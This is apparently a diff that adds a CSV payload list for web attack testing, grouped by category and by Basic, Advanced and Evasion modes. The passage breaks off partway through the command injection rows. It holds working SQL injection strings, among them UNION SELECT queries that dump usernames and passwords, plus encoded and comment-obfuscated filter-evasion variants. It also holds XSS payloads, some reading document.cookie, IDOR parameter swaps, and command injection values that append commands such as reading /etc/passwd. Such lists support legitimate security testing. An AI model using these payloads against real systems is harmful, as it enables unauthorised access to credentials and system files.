@@ -1,0 +1,2161 @@
+﻿category,mode,index,payload
+SQL Injection,Basic,1,%27%20OR%20%27a%27=%27a
+SQL Injection,Basic,2,' AND 1=1--
+SQL Injection,Basic,3,%27%20or%20%271%27=%271
+SQL Injection,Basic,4,'/**/UNION/**/SELECT/**/NULL--
+SQL Injection,Basic,5,%2527%2520AND%25201=1--
+SQL Injection,Basic,6,' OR '1'='1
+SQL Injection,Basic,7,'/**/OR/**/EXISTS(SELECT/**/1)--
+SQL Injection,Basic,8,' OR '1'='1
+SQL Injection,Basic,9,'/**/OR/**/1=1--
+SQL Injection,Basic,10,%27%20UNION%20SELECT%20NULL--
+SQL Injection,Basic,11,' OR '1'='1
+SQL Injection,Basic,12,' OR '1'='1
+SQL Injection,Basic,13,' OR EXISTS(SELECT 1)--
+SQL Injection,Basic,14,' OR 1=1--
+SQL Injection,Basic,15,' OR '1'='1
+SQL Injection,Basic,16,'/**/AND/**/1=1--
+SQL Injection,Basic,17,' OR 1=1--
+SQL Injection,Basic,18,' AND 1=1--
+SQL Injection,Basic,19,' OR ''='
+SQL Injection,Basic,20,' OR 1=1--
+SQL Injection,Basic,21,' OR 1=1--
+SQL Injection,Basic,22,'/**/or/**/''='
+SQL Injection,Basic,23,'/**/OR/**/'x'='x'--
+SQL Injection,Basic,24,' or '1'='1
+SQL Injection,Basic,25,' OR 1=1#
+SQL Injection,Basic,26,' OR 1=1--
+SQL Injection,Basic,27,"' UNION SELECT username,password FROM users--"
+SQL Injection,Basic,28,' OR 1=1#
+SQL Injection,Basic,29,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Basic,30,' AND 1=1--
+SQL Injection,Basic,31,'/**/or/**/''='
+SQL Injection,Basic,32,'/**/UNION/**/SELECT/**/NULL--
+SQL Injection,Basic,33,' OR ''='
+SQL Injection,Basic,34,' AND 1=1--
+SQL Injection,Basic,35,"' union SELECT username,password FROM users--"
+SQL Injection,Basic,36,' OR 'x'='x'--
+SQL Injection,Basic,37,' OR 1=1--
+SQL Injection,Basic,38,%27/**/OR/**/1=1--
+SQL Injection,Basic,39,' OR EXISTS(SELECT 1)--
+SQL Injection,Basic,40,' UNION SELECT NULL--
+SQL Injection,Basic,41,' UNION SELECT NULL--
+SQL Injection,Basic,42,' OR ''='
+SQL Injection,Basic,43,' OR 1=1--
+SQL Injection,Basic,44,%27%20OR%20%27a%27=%27a
+SQL Injection,Basic,45,%2527%2520OR%2520%2527%2527=%2527
+SQL Injection,Basic,46,' OR EXISTS(SELECT 1)--
+SQL Injection,Basic,47,' OR 1=1#
+SQL Injection,Basic,48,' UNION SELECT NULL--
+SQL Injection,Basic,49,' OR 1=1--
+SQL Injection,Basic,50,"' union SELECT username,password FROM users--"
+SQL Injection,Basic,51,' OR 'a'='a
+SQL Injection,Basic,52,%27%20OR%20%271%27=%271
+SQL Injection,Basic,53,%27%20OR%20%27%27=%27
+SQL Injection,Basic,54,' OR EXISTS(SELECT 1)--
+SQL Injection,Basic,55,' OR 1=1--
+SQL Injection,Basic,56,"' UNION SELECT username,password FROM users--"
+SQL Injection,Basic,57,%27%20OR%20%27%27=%27
+SQL Injection,Basic,58,' OR ''='
+SQL Injection,Basic,59,%27%20AND%201=1--
+SQL Injection,Basic,60,' UNION SELECT NULL--
+SQL Injection,Advanced,1,'/**/OR/**/''='
+SQL Injection,Advanced,2,'/**/or/**/EXISTS(SELECT/**/1)--
+SQL Injection,Advanced,3,%27%20OR%201=1--
+SQL Injection,Advanced,4,'/**/OR/**/'a'='a
+SQL Injection,Advanced,5,'/**/OR/**/1=1#
+SQL Injection,Advanced,6,'/**/OR/**/'1'='1
+SQL Injection,Advanced,7,'/**/OR/**/'a'='a
+SQL Injection,Advanced,8,%27/**/or/**/%27x%27=%27x%27--
+SQL Injection,Advanced,9,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,10,'/**/OR/**/1=1--
+SQL Injection,Advanced,11,'/**/OR/**/EXISTS(SELECT/**/1)--
+SQL Injection,Advanced,12,'/**/OR/**/'a'='a
+SQL Injection,Advanced,13,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,14,'/**/OR/**/1=1--
+SQL Injection,Advanced,15,'/**/AND/**/1=1--
+SQL Injection,Advanced,16,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,17,'/**/OR/**/'1'='1
+SQL Injection,Advanced,18,'/**/OR/**/1=1--
+SQL Injection,Advanced,19,'/**/or/**/'1'='1
+SQL Injection,Advanced,20,'/**/OR/**/1=1--
+SQL Injection,Advanced,21,'/**/OR/**/1=1--
+SQL Injection,Advanced,22,'/**/OR/**/''='
+SQL Injection,Advanced,23,'/**/AND/**/1=1--
+SQL Injection,Advanced,24,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,25,'/**/OR/**/'a'='a
+SQL Injection,Advanced,26,'/**/OR/**/'1'='1
+SQL Injection,Advanced,27,'/**/OR/**/'1'='1
+SQL Injection,Advanced,28,'/**/AND/**/1=1--
+SQL Injection,Advanced,29,%2527%2520OR%2520%25271%2527=%25271
+SQL Injection,Advanced,30,'/**/OR/**/EXISTS(SELECT/**/1)--
+SQL Injection,Advanced,31,'/**/OR/**/1=1--
+SQL Injection,Advanced,32,%2527%2520OR%2520%25271%2527=%25271
+SQL Injection,Advanced,33,'/**/OR/**/'a'='a
+SQL Injection,Advanced,34,'/**/OR/**/'a'='a
+SQL Injection,Advanced,35,'/**/OR/**/EXISTS(SELECT/**/1)--
+SQL Injection,Advanced,36,'/**/or/**/1=1--
+SQL Injection,Advanced,37,'/**/OR/**/1=1#
+SQL Injection,Advanced,38,'/**/union/**/SELECT/**/NULL--
+SQL Injection,Advanced,39,'/**/OR/**/1=1--
+SQL Injection,Advanced,40,%27/**/or/**/%27x%27=%27x%27--
+SQL Injection,Advanced,41,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,42,%27%20OR%20EXISTS(SELECT%201)--
+SQL Injection,Advanced,43,'/**/OR/**/'1'='1
+SQL Injection,Advanced,44,'/**/OR/**/'1'='1
+SQL Injection,Advanced,45,%2527%2520OR%2520%2527a%2527=%2527a
+SQL Injection,Advanced,46,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,47,'/**/OR/**/'x'='x'--
+SQL Injection,Advanced,48,'/**/UNION/**/SELECT/**/NULL--
+SQL Injection,Advanced,49,'/**/OR/**/'a'='a
+SQL Injection,Advanced,50,'/**/UNION/**/SELECT/**/NULL--
+SQL Injection,Advanced,51,'/**/OR/**/'1'='1
+SQL Injection,Advanced,52,'/**/OR/**/'x'='x'--
+SQL Injection,Advanced,53,'/**/OR/**/'a'='a
+SQL Injection,Advanced,54,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,55,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,56,%27%20UNION%20SELECT%20NULL--
+SQL Injection,Advanced,57,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Advanced,58,'/**/UNION/**/SELECT/**/NULL--
+SQL Injection,Advanced,59,'/**/OR/**/'x'='x'--
+SQL Injection,Advanced,60,'/**/OR/**/1=1#
+SQL Injection,Evasion,1,%27%20OR%20%27a%27=%27a
+SQL Injection,Evasion,2,%27%20AND%201=1--
+SQL Injection,Evasion,3,%27%20or%20EXISTS(SELECT%201)--
+SQL Injection,Evasion,4,%27%20OR%201=1--
+SQL Injection,Evasion,5,%27%20AND%201=1--
+SQL Injection,Evasion,6,%27%20OR%20%271%27=%271
+SQL Injection,Evasion,7,%27%20AND%201=1--
+SQL Injection,Evasion,8,"%27%20UNION%20SELECT%20username,password%20FROM%20users--"
+SQL Injection,Evasion,9,%27%20AND%201=1--
+SQL Injection,Evasion,10,%2527%2520OR%2520%2527x%2527=%2527x%2527--
+SQL Injection,Evasion,11,%27%20AND%201=1--
+SQL Injection,Evasion,12,%27%20OR%201=1--
+SQL Injection,Evasion,13,%27%20OR%201=1#
+SQL Injection,Evasion,14,%27%20OR%20%271%27=%271
+SQL Injection,Evasion,15,%27%20OR%201=1#
+SQL Injection,Evasion,16,"%27%20UNION%20SELECT%20username,password%20FROM%20users--"
+SQL Injection,Evasion,17,%27%20OR%20%27a%27=%27a
+SQL Injection,Evasion,18,%27%20UNION%20SELECT%20NULL--
+SQL Injection,Evasion,19,%2527/**/AND/**/1=1--
+SQL Injection,Evasion,20,%27%20AND%201=1--
+SQL Injection,Evasion,21,%27%20AND%201=1--
+SQL Injection,Evasion,22,"%27%20union%20SELECT%20username,password%20FROM%20users--"
+SQL Injection,Evasion,23,%27%20UNION%20SELECT%20NULL--
+SQL Injection,Evasion,24,%2527%2520or%25201=1#
+SQL Injection,Evasion,25,%27%20OR%20%27x%27=%27x%27--
+SQL Injection,Evasion,26,%27%20OR%201=1--
+SQL Injection,Evasion,27,%27%20OR%20%271%27=%271
+SQL Injection,Evasion,28,%27%20or%20EXISTS(SELECT%201)--
+SQL Injection,Evasion,29,%27%20OR%201=1--
+SQL Injection,Evasion,30,"%27/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Evasion,31,%27%20OR%201=1--
+SQL Injection,Evasion,32,%27%20OR%201=1--
+SQL Injection,Evasion,33,%27%20OR%20%27%27=%27
+SQL Injection,Evasion,34,%2527%2520UNION%2520SELECT%2520NULL--
+SQL Injection,Evasion,35,%27/**/OR/**/%27x%27=%27x%27--
+SQL Injection,Evasion,36,%27%20OR%20%271%27=%271
+SQL Injection,Evasion,37,%27/**/or/**/1=1#
+SQL Injection,Evasion,38,%252527/**/OR/**/%252527x%252527=%252527x%252527--
+SQL Injection,Evasion,39,%27%20OR%20%27%27=%27
+SQL Injection,Evasion,40,%2527/**/OR/**/%2527a%2527=%2527a
+SQL Injection,Evasion,41,%27%20OR%20%271%27=%271
+SQL Injection,Evasion,42,"%27%20UNION%20SELECT%20username,password%20FROM%20users--"
+SQL Injection,Evasion,43,%27/**/AND/**/1=1--
+SQL Injection,Evasion,44,"%27%20UNION%20SELECT%20username,password%20FROM%20users--"
+SQL Injection,Evasion,45,%27%20OR%20%27a%27=%27a
+SQL Injection,Evasion,46,%27%20OR%201=1#
+SQL Injection,Evasion,47,%27%20OR%20EXISTS(SELECT%201)--
+SQL Injection,Evasion,48,%27%20OR%201=1--
+SQL Injection,Evasion,49,"%27/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"
+SQL Injection,Evasion,50,%27%20OR%201=1#
+SQL Injection,Evasion,51,%27%20OR%20%27a%27=%27a
+SQL Injection,Evasion,52,%27%20OR%201=1--
+SQL Injection,Evasion,53,%2527%2520or%2520%2527%2527=%2527
+SQL Injection,Evasion,54,%27%20OR%20%27%27=%27
+SQL Injection,Evasion,55,%27%20UNION%20SELECT%20NULL--
+SQL Injection,Evasion,56,%27%20OR%20%27a%27=%27a
+SQL Injection,Evasion,57,%27%20UNION%20SELECT%20NULL--
+SQL Injection,Evasion,58,%27%20OR%20%27a%27=%27a
+SQL Injection,Evasion,59,%27%20union%20SELECT%20NULL--
+SQL Injection,Evasion,60,%2527%2520or%2520%2527x%2527=%2527x%2527--
+XSS,Basic,1,<iframe src=javascript:alert(1)>
+XSS,Basic,2,<script>confirm(1)</script>
+XSS,Basic,3,<script>alert(1)</script>
+XSS,Basic,4,<svg onload=confirm(1)>
+XSS,Basic,5,<body onload=alert(1)>
+XSS,Basic,6,<svg onload=alert(1)>
+XSS,Basic,7,<iframe src=javascript:alert(1)>
+XSS,Basic,8,<img src=x onerror=confirm(1)>
+XSS,Basic,9,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E
+XSS,Basic,10,<script>prompt(1)</script>
+XSS,Basic,11,<svg onload=alert(1)>
+XSS,Basic,12,<img src=x onerror=confirm(1)>
+XSS,Basic,13,<script>alert(1)</script>
+XSS,Basic,14,<img src=x onerror=alert(1)>
+XSS,Basic,15,<script>alert(1)</script>
+XSS,Basic,16,<img src=x onerror=alert(1)>
+XSS,Basic,17,<script>alert(document.cookie)</script>
+XSS,Basic,18,<script>alert(1)</script>
+XSS,Basic,19,<script>prompt(1)</script>
+XSS,Basic,20,<img src=x onerror=confirm(1)>
+XSS,Basic,21,<svg onload=confirm(1)>
+XSS,Basic,22,%253Cscript%253Eprompt(1)%253C/script%253E
+XSS,Basic,23,<img src=x onerror=alert(1)>
+XSS,Basic,24,<ScRiPt>alert(1)</ScRiPt>
+XSS,Basic,25,<img src=x onerror=alert(1)>
+XSS,Basic,26,<script>alert(1)</script>
+XSS,Basic,27,<svg onload=alert(1)>
+XSS,Basic,28,<script>alert(document.cookie)</script>
+XSS,Basic,29,%3Csvg%20onload=confirm(1)%3E
+XSS,Basic,30,<script>alert(1)</script>
+XSS,Basic,31,<body onload=alert(1)>
+XSS,Basic,32,<svg onload=confirm(1)>
+XSS,Basic,33,<body onload=alert(1)>
+XSS,Basic,34,<iframe src=javascript:alert(1)>
+XSS,Basic,35,<svg onload=confirm(1)>
+XSS,Basic,36,<body onload=alert(1)>
+XSS,Basic,37,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Basic,38,<iframe src=javascript:alert(1)>
+XSS,Basic,39,<svg onload=alert(1)>
+XSS,Basic,40,<script>confirm(1)</script>
+XSS,Basic,41,<script>alert(1)</script>
+XSS,Basic,42,<img src=x onerror=confirm(1)>
+XSS,Basic,43,<body onload=alert(1)>
+XSS,Basic,44,<script>prompt(1)</script>
+XSS,Basic,45,<script>alert(1)</script>
+XSS,Basic,46,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E
+XSS,Basic,47,<svg onload=confirm(1)>
+XSS,Basic,48,<script>confirm(1)</script>
+XSS,Basic,49,<script>confirm(1)</script>
+XSS,Basic,50,%253Cimg%2520src=x%2520onerror=confirm(1)%253E
+XSS,Basic,51,<script>alert(document.cookie)</script>
+XSS,Basic,52,<svg onload=alert(1)>
+XSS,Basic,53,<script>prompt(1)</script>
+XSS,Basic,54,<script>alert(document.cookie)</script>
+XSS,Basic,55,<script>alert(document.cookie)</script>
+XSS,Basic,56,<iframe src=javascript:alert(1)>
+XSS,Basic,57,<iframe src=javascript:alert(1)>
+XSS,Basic,58,%3Csvg%20onload=alert(1)%3E
+XSS,Basic,59,<script>confirm(1)</script>
+XSS,Basic,60,<img src=x onerror=alert(1)>
+XSS,Advanced,1,<img src=x onerror=alert(1)>
+XSS,Advanced,2,<script>alert(1)</script>
+XSS,Advanced,3,<script>alert(document.cookie)</script>
+XSS,Advanced,4,<svg onload=alert(1)>
+XSS,Advanced,5,<img src=x onerror=confirm(1)>
+XSS,Advanced,6,%3Cimg%20src=x%20onerror=confirm(1)%3E
+XSS,Advanced,7,<body onload=alert(1)>
+XSS,Advanced,8,<ScRiPt>prompt(1)</ScRiPt>
+XSS,Advanced,9,<ScRiPt>alert(1)</ScRiPt>
+XSS,Advanced,10,<script>confirm(1)</script>
+XSS,Advanced,11,<svg onload=confirm(1)>
+XSS,Advanced,12,<img src=x onerror=confirm(1)>
+XSS,Advanced,13,<body onload=alert(1)>
+XSS,Advanced,14,<img src=x onerror=alert(1)>
+XSS,Advanced,15,<body onload=alert(1)>
+XSS,Advanced,16,%3Ciframe%20src=javascript:alert(1)%3E
+XSS,Advanced,17,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E
+XSS,Advanced,18,<script>alert(document.cookie)</script>
+XSS,Advanced,19,<img src=x onerror=confirm(1)>
+XSS,Advanced,20,<script>confirm(1)</script>
+XSS,Advanced,21,<img src=x onerror=alert(1)>
+XSS,Advanced,22,<script>alert(document.cookie)</script>
+XSS,Advanced,23,<svg onload=confirm(1)>
+XSS,Advanced,24,<script>confirm(1)</script>
+XSS,Advanced,25,%3Csvg%20onload=confirm(1)%3E
+XSS,Advanced,26,<svg onload=confirm(1)>
+XSS,Advanced,27,<svg onload=alert(1)>
+XSS,Advanced,28,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Advanced,29,<script>confirm(1)</script>
+XSS,Advanced,30,<svg onload=confirm(1)>
+XSS,Advanced,31,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E
+XSS,Advanced,32,<script>alert(1)</script>
+XSS,Advanced,33,<svg onload=alert(1)>
+XSS,Advanced,34,<ScRiPt>prompt(1)</ScRiPt>
+XSS,Advanced,35,<iframe src=javascript:alert(1)>
+XSS,Advanced,36,<script>alert(1)</script>
+XSS,Advanced,37,<img src=x onerror=confirm(1)>
+XSS,Advanced,38,<ScRiPt>confirm(1)</ScRiPt>
+XSS,Advanced,39,<script>alert(document.cookie)</script>
+XSS,Advanced,40,<script>prompt(1)</script>
+XSS,Advanced,41,<ScRiPt>confirm(1)</ScRiPt>
+XSS,Advanced,42,<body onload=alert(1)>
+XSS,Advanced,43,<iframe src=javascript:alert(1)>
+XSS,Advanced,44,<script>confirm(1)</script>
+XSS,Advanced,45,<svg onload=confirm(1)>
+XSS,Advanced,46,<iframe src=javascript:alert(1)>
+XSS,Advanced,47,<img src=x onerror=alert(1)>
+XSS,Advanced,48,<img src=x onerror=confirm(1)>
+XSS,Advanced,49,<script>prompt(1)</script>
+XSS,Advanced,50,<body onload=alert(1)>
+XSS,Advanced,51,<img src=x onerror=confirm(1)>
+XSS,Advanced,52,<iframe src=javascript:alert(1)>
+XSS,Advanced,53,<ScRiPt>alert(document.cookie)</ScRiPt>
+XSS,Advanced,54,<script>prompt(1)</script>
+XSS,Advanced,55,<img src=x onerror=alert(1)>
+XSS,Advanced,56,<script>prompt(1)</script>
+XSS,Advanced,57,<body onload=alert(1)>
+XSS,Advanced,58,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Advanced,59,<img src=x onerror=alert(1)>
+XSS,Advanced,60,%3Cscript%3Eprompt(1)%3C/script%3E
+XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,2,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Evasion,3,%3Csvg%20onload=alert(1)%3E
+XSS,Evasion,4,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E
+XSS,Evasion,5,%3Cscript%3Eprompt(1)%3C/script%3E
+XSS,Evasion,6,%253Cimg%2520src=x%2520onerror=confirm(1)%253E
+XSS,Evasion,7,%3Csvg%20onload=confirm(1)%3E
+XSS,Evasion,8,%3Cimg%20src=x%20onerror=confirm(1)%3E
+XSS,Evasion,9,%3Csvg%20onload=confirm(1)%3E
+XSS,Evasion,10,%3Cbody%20onload=alert(1)%3E
+XSS,Evasion,11,%253Csvg%2520onload=alert(1)%253E
+XSS,Evasion,12,%3Ciframe%20src=javascript:alert(1)%3E
+XSS,Evasion,13,%3Cscript%3Ealert(1)%3C/script%3E
+XSS,Evasion,14,%3Csvg%20onload=alert(1)%3E
+XSS,Evasion,15,%3Csvg%20onload=confirm(1)%3E
+XSS,Evasion,16,%3Cscript%3Ealert(1)%3C/script%3E
+XSS,Evasion,17,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Evasion,18,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,19,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,20,%3Cbody%20onload=alert(1)%3E
+XSS,Evasion,21,%3Cbody%20onload=alert(1)%3E
+XSS,Evasion,22,%3Csvg%20onload=confirm(1)%3E
+XSS,Evasion,23,%3Cscript%3Econfirm(1)%3C/script%3E
+XSS,Evasion,24,%3Csvg%20onload=alert(1)%3E
+XSS,Evasion,25,%3Cbody%20onload=alert(1)%3E
+XSS,Evasion,26,%3Cscript%3Econfirm(1)%3C/script%3E
+XSS,Evasion,27,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,28,%25253Cscript%25253Ealert(1)%25253C/script%25253E
+XSS,Evasion,29,%253Cscript%253Ealert(1)%253C/script%253E
+XSS,Evasion,30,%3Cscript%3Eprompt(1)%3C/script%3E
+XSS,Evasion,31,%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E
+XSS,Evasion,32,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,33,%253Csvg%2520onload=confirm(1)%253E
+XSS,Evasion,34,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,35,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Evasion,36,%3Cscript%3Ealert(1)%3C/script%3E
+XSS,Evasion,37,%3Cscript%3Eprompt(1)%3C/script%3E
+XSS,Evasion,38,%3Cscript%3Ealert(1)%3C/script%3E
+XSS,Evasion,39,%3Cimg%20src=x%20onerror=confirm(1)%3E
+XSS,Evasion,40,%3Cscript%3Ealert(1)%3C/script%3E
+XSS,Evasion,41,%3Cscript%3Eprompt(1)%3C/script%3E
+XSS,Evasion,42,%3Cimg%20src=x%20onerror=confirm(1)%3E
+XSS,Evasion,43,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E
+XSS,Evasion,44,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E
+XSS,Evasion,45,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Evasion,46,%3Cscript%3Econfirm(1)%3C/script%3E
+XSS,Evasion,47,%3Cscript%3Econfirm(1)%3C/script%3E
+XSS,Evasion,48,%3Csvg%20onload=confirm(1)%3E
+XSS,Evasion,49,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,50,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,51,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Evasion,52,%3Cscript%3Ealert(1)%3C/script%3E
+XSS,Evasion,53,%3Cimg%20src=x%20onerror=alert(1)%3E
+XSS,Evasion,54,%253Cimg%2520src=x%2520onerror=confirm(1)%253E
+XSS,Evasion,55,%3Cscript%3Ealert(document.cookie)%3C/script%3E
+XSS,Evasion,56,%3Cscript%3Econfirm(1)%3C/script%3E
+XSS,Evasion,57,%253CScRiPt%253Ealert(document.cookie)%253C/ScRiPt%253E
+XSS,Evasion,58,%3Csvg%20onload=alert(1)%3E
+XSS,Evasion,59,%253Cscript%253Eprompt(1)%253C/script%253E
+XSS,Evasion,60,%3Csvg%20onload=confirm(1)%3E
+IDOR,Basic,1,user=2
+IDOR,Basic,2,id=100
+IDOR,Basic,3,id=3
+IDOR,Basic,4,user=2
+IDOR,Basic,5,id=100
+IDOR,Basic,6,id=1
+IDOR,Basic,7,id=3
+IDOR,Basic,8,id=3
+IDOR,Basic,9,id=103
+IDOR,Basic,10,account=1
+IDOR,Basic,11,id=2
+IDOR,Basic,12,account=1
+IDOR,Basic,13,user=2
+IDOR,Basic,14,id=2
+IDOR,Basic,15,id=2
+IDOR,Basic,16,id=103
+IDOR,Basic,17,id=100
+IDOR,Basic,18,account=2
+IDOR,Basic,19,id=1
+IDOR,Basic,20,id=3
+IDOR,Basic,21,id=100
+IDOR,Basic,22,id=1
+IDOR,Basic,23,user=1
+IDOR,Basic,24,account=1
+IDOR,Basic,25,id=2
+IDOR,Basic,26,id=3
+IDOR,Basic,27,user=2
+IDOR,Basic,28,id=1
+IDOR,Basic,29,id=2
+IDOR,Basic,30,id=2
+IDOR,Basic,31,account=2
+IDOR,Basic,32,id=103
+IDOR,Basic,33,id=1
+IDOR,Basic,34,id=3
+IDOR,Basic,35,id=3
+IDOR,Basic,36,user=2
+IDOR,Basic,37,account=2
+IDOR,Basic,38,id=1
+IDOR,Basic,39,id=1
+IDOR,Basic,40,id=3
+IDOR,Basic,41,id=100
+IDOR,Basic,42,id=2
+IDOR,Basic,43,id=103
+IDOR,Basic,44,user=3
+IDOR,Basic,45,id=100
+IDOR,Basic,46,account=2
+IDOR,Basic,47,account=1
+IDOR,Basic,48,user=3
+IDOR,Basic,49,user=1
+IDOR,Basic,50,user=3
+IDOR,Basic,51,id=2
+IDOR,Basic,52,user=1
+IDOR,Basic,53,id=3
+IDOR,Basic,54,id=2
+IDOR,Basic,55,user=1
+IDOR,Basic,56,user=2
+IDOR,Basic,57,account=1
+IDOR,Basic,58,user=1
+IDOR,Basic,59,id=100
+IDOR,Basic,60,id=100
+IDOR,Advanced,1,account=2
+IDOR,Advanced,2,user=3
+IDOR,Advanced,3,id=100
+IDOR,Advanced,4,account=2
+IDOR,Advanced,5,id=1
+IDOR,Advanced,6,user=2
+IDOR,Advanced,7,id=3
+IDOR,Advanced,8,user=2
+IDOR,Advanced,9,user=2
+IDOR,Advanced,10,user=1
+IDOR,Advanced,11,id=2
+IDOR,Advanced,12,account=1
+IDOR,Advanced,13,id=3
+IDOR,Advanced,14,user=2
+IDOR,Advanced,15,id=103
+IDOR,Advanced,16,user=2
+IDOR,Advanced,17,user=2
+IDOR,Advanced,18,id=3
+IDOR,Advanced,19,id=2
+IDOR,Advanced,20,id=3
+IDOR,Advanced,21,user=2
+IDOR,Advanced,22,id=2
+IDOR,Advanced,23,id=2
+IDOR,Advanced,24,id=100
+IDOR,Advanced,25,id=103
+IDOR,Advanced,26,account=2
+IDOR,Advanced,27,user=3
+IDOR,Advanced,28,id=2
+IDOR,Advanced,29,user=2
+IDOR,Advanced,30,id=4
+IDOR,Advanced,31,id=103
+IDOR,Advanced,32,id=103
+IDOR,Advanced,33,account=1
+IDOR,Advanced,34,id=1
+IDOR,Advanced,35,account=2
+IDOR,Advanced,36,id=2
+IDOR,Advanced,37,id=100
+IDOR,Advanced,38,user=1
+IDOR,Advanced,39,id=1
+IDOR,Advanced,40,id=2
+IDOR,Advanced,41,id=100
+IDOR,Advanced,42,id=1
+IDOR,Advanced,43,id=1
+IDOR,Advanced,44,id=1
+IDOR,Advanced,45,id=2
+IDOR,Advanced,46,id=103
+IDOR,Advanced,47,account=2
+IDOR,Advanced,48,id=100
+IDOR,Advanced,49,id=2
+IDOR,Advanced,50,user=2
+IDOR,Advanced,51,user=1
+IDOR,Advanced,52,id=2
+IDOR,Advanced,53,id=3
+IDOR,Advanced,54,id=1
+IDOR,Advanced,55,account=1
+IDOR,Advanced,56,id=100
+IDOR,Advanced,57,id=1
+IDOR,Advanced,58,id=3
+IDOR,Advanced,59,user=1
+IDOR,Advanced,60,id=2
+IDOR,Evasion,1,id=2
+IDOR,Evasion,2,id=2
+IDOR,Evasion,3,user=1
+IDOR,Evasion,4,id=2
+IDOR,Evasion,5,id=100
+IDOR,Evasion,6,user=2
+IDOR,Evasion,7,user=1
+IDOR,Evasion,8,id=2
+IDOR,Evasion,9,id=1
+IDOR,Evasion,10,account=1
+IDOR,Evasion,11,id=4
+IDOR,Evasion,12,id=100
+IDOR,Evasion,13,id=1
+IDOR,Evasion,14,user=2
+IDOR,Evasion,15,user=1
+IDOR,Evasion,16,user=2
+IDOR,Evasion,17,id=100
+IDOR,Evasion,18,id=3
+IDOR,Evasion,19,account=1
+IDOR,Evasion,20,user=2
+IDOR,Evasion,21,user=1
+IDOR,Evasion,22,id=100
+IDOR,Evasion,23,account=1
+IDOR,Evasion,24,account=2
+IDOR,Evasion,25,user=1
+IDOR,Evasion,26,user=2
+IDOR,Evasion,27,user=2
+IDOR,Evasion,28,id=100
+IDOR,Evasion,29,user=2
+IDOR,Evasion,30,user=1
+IDOR,Evasion,31,id=1
+IDOR,Evasion,32,id=4
+IDOR,Evasion,33,id=3
+IDOR,Evasion,34,account=1
+IDOR,Evasion,35,user=1
+IDOR,Evasion,36,user=3
+IDOR,Evasion,37,user=2
+IDOR,Evasion,38,user=2
+IDOR,Evasion,39,user=3
+IDOR,Evasion,40,id=4
+IDOR,Evasion,41,account=1
+IDOR,Evasion,42,id=4
+IDOR,Evasion,43,id=2
+IDOR,Evasion,44,id=103
+IDOR,Evasion,45,id=2
+IDOR,Evasion,46,user=1
+IDOR,Evasion,47,account=1
+IDOR,Evasion,48,user=1
+IDOR,Evasion,49,user=2
+IDOR,Evasion,50,id=3
+IDOR,Evasion,51,id=3
+IDOR,Evasion,52,id=103
+IDOR,Evasion,53,user=2
+IDOR,Evasion,54,id=2
+IDOR,Evasion,55,id=103
+IDOR,Evasion,56,id=100
+IDOR,Evasion,57,id=3
+IDOR,Evasion,58,id=1
+IDOR,Evasion,59,user=1
+IDOR,Evasion,60,id=2
+Command Injection,Basic,1,&& uname -a
+Command Injection,Basic,2,| cat /etc/passwd
+Command Injection,Basic,3,; pwd
+Command Injection,Basic,4,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Basic,5,; pwd
+Command Injection,Basic,6,&& id
+Command Injection,Basic,7,&& id
+Command Injection,Basic,8,| cat /etc/passwd
+Command Injection,Basic,9,;${IFS}cat${IFS}/etc/passwd
+Command Injection,Basic,10,; ls
+Command Injection,Basic,11,; pwd
+Command Injection,Basic,12,&& id
+Command Injection,Basic,13,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Basic,14,; pwd
+Command Injection,Basic,15,; whoami
+Command Injection,Basic,16,| whoami
+Command Injection,Basic,17,; cat /etc/passwd
+Command Injection,Basic,18,| cat /etc/passwd
+Command Injection,Basic,19,|${IFS}cat${IFS}/etc/passwd
+Command Injection,Basic,20,; ls
+Command Injection,Basic,21,; pwd
+Command Injection,Basic,22,&&${IFS}uname${IFS}-a
+Command Injection,Basic,23,&& id
+Command Injection,Basic,24,; pwd
+Command Injection,Basic,25,| whoami
+Command Injection,Basic,26,&& uname -a
+Command Injection,Basic,27,; pwd
+Command Injection,Basic,28,; ls
+Command Injection,Basic,29,; cat /etc/passwd
+Command Injection,Basic,30,; whoami
+Command Injection,Basic,31,| whoami
+Command Injection,Basic,32,&& uname -a
